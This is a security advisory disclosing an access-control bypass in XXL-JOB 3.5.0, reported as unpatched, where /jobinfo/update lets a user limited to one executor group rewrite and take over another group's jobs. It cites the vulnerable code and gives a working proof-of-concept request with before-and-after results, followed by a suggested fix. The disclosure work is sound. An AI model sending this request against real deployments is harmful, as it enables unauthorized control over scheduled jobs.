# XXL-JOB-2026-01: Cross-group job takeover through /jobinfo/update

| | |
|---|---|
| Product | XXL-JOB, `xxl-job-admin` (https://github.com/xuxueli/xxl-job) |
| Vendor | xuxueli |
| Affected version | 3.5.0 (latest release, tag commit `3bebfc16`). Earlier versions not tested. |
| Fixed version | none at time of writing |
| Vulnerability type | Incorrect Access Control (CWE-639, authorization bypass through user-controlled key) |
| Required access | Authenticated normal user with permission on at least one executor group |
| CVE | pending |
| Reporter | thientc (VinSOC) |
| Related | CVE-2023-33779, CVE-2025-9264 |

## Summary

`POST /jobinfo/update` checks the caller's permission against the `jobGroup` sent in the request, not against the group the job already belongs to. A user who may manage one executor group can rewrite any other group's job (handler, parameters, schedule, child jobs) and move it into their own group.

## Details

The controller validates only the requested group (`xxl-job-admin/src/main/java/com/xxl/job/admin/business/controller/JobInfoController.java:113`):

```java
LoginInfo loginInfo = JobGroupPermissionUtil.validJobGroupPermission(request, jobInfo.getJobGroup());
```

`XxlJobServiceImpl.update` then loads the stored job by the request `id` (`XxlJobServiceImpl.java:273`), copies the submitted fields over it, including `jobGroup`, and saves it (`XxlJobServiceImpl.java:315`). It never checks `exists_jobInfo.getJobGroup()`.

The other job operations were fixed to check the stored job's group. `remove`, which CVE-2025-9264 covered, now does `hasJobGroupPermission(loginInfo, xxlJobInfo.getJobGroup())` on the loaded job (`XxlJobServiceImpl.java:333`), and so do `start`, `stop` and `trigger`. `update` was left out. Cross-group access through `/jobinfo/update` was earlier reported for 2.4.1 as CVE-2023-33779. In 3.5.0 the plain form of that request is rejected, but the bypass below still works.

## Proof of concept

Local lab built from the 3.5.0 tag (Spring Boot 4.1.2, MySQL 8.4), two executor groups, test user `alice` with permission on group 2 only. Job 1 belongs to group 1.

Controls, both rejected with `Permission limit`:

```
POST /jobinfo/delete   ids[]=1
POST /jobinfo/update   id=1&jobGroup=1&...
```

Bypass, sending alice's own group with job 1's id:

```
POST /jobinfo/update   (alice's session)
id=1&jobGroup=2&name=L01-renamed-by-alice&author=alice&scheduleType=CRON&scheduleConf=0 0 0 * * ? *&misfireStrategy=DO_NOTHING&executorRouteStrategy=FIRST&executorHandler=demoJobHandler&executorParam=L01-ALICE-MARKER-5e8d&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&childJobId=

{"code":200,"data":null,"msg":"Success","success":true}
```

Job 1 before and after:

```
id  job_group  name                  executor_param
1   1          (sample job)          G1-ORIG-MARKER-a1b2c3
1   2          L01-renamed-by-alice  L01-ALICE-MARKER-5e8d
```

It reproduced twice, with the database reset between runs.

## Impact

A user confined to one executor group can change what any other group's job runs and with which parameters, and can take the job away from its group. I demonstrated the modification and the move on test data; I did not run the modified job on a real executor.

## Fix

In `update`, load the stored job first and require `hasJobGroupPermission(loginInfo, exists_jobInfo.getJobGroup())` as well as permission on the target group.

## Timeline

- 2026-11-02: reported to the vendor by email. No reply.
- 2026-11-17: CVE requested from MITRE.
